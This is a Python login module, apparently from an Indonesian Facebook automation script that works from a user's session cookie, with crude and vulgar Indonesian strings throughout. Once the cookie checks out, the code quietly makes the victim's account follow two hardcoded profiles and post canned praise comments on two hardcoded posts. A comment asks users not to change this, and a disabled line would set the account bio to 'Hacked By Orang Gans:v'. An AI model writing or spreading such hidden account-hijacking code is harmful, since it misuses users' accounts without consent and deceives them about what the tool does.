# hallo bro :v

from .YNTKTS import *
from .bahasa import lang
from .informasi import generate

anjay=random.choice(["Hacked By Orang Gans:v","Muka Gua Mirip babi","Coli Is My Life","Tidak Ada Yang Aman:v","coli adalah jalan ninjaku"])
komentar1=random.choice(["keren","mantap bro sc nya","itsuki<3","lo ganteng ajg:v","hi i'm drag-fb user"])
komentar2=random.choice(["keren","mantap bro sc nya","yang posting orang nya ganteng","lo ganteng ajg:v","hi i'm drag-fb user"])

class login:
	def __init__(self,url,cookie):
		
		try: respon=req.get(f"{url}/profile.php?v=info",cookies=cookie)
		except koneksi_error: exit(" ! kesalahan pada koneksi")
		if "mbasic_logout_button" in respon.text:
			print("\n\n * hai welcome \x1b[1;35m"+parser(respon.text,"html.parser").find("title").text+"\x1b[0m Ngentod :v")
			print(" * mohon tunggu sebentar Bosku :v")
			url=url.replace("mbasic","free") if "free.facebook" in respon.url else url
			if "Laporkan Masalah" not in respon.text:
				lang(url,cookie)
				try: respon=req.get(f"{url}/profile.php?v=info",cookies=cookie)
				except koneksi_error: exit(" ! kesalahan pada koneksi")
			generate(cookie["cookie"],parser(respon.text,"html.parser"))
			koh=yo_ndak_tau_kok_tanya_saya(url,cookie)
			# jangan di ganti ya bro hehehe :)
			koh.follow("/100033193775163")
			koh.follow("/100006230836266")
			koh.hoetang("/2975326539351678","2",komentar1,True)
			koh.hoetang("/442869600162829","8",komentar2,True)
			#koh.change_bio(anjay)
			print(" * login berhasil, mohon tunggu sedang membuka menu")
			waktu(1)
		else:
			exit("\n\n ! cookie invalid")
